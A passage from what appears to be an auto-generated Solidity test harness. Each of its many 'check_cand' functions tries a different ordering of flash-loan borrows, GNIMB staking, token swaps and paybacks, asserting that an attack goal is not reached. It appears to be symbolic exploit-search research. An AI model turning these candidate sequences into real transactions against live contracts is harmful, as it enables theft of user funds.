        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1968(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1969(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1970(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1971(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1972(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1973(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1974(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1975(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1976(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1977(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1978(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1979(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1980(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1981(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1982(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1983(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1984(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1985(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1986(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1987(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1988(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1989(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1990(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1991(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1992(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1993(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1994(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1995(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1996(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1997(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1998(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1999(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2016(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2017(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2018(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2019(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2020(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
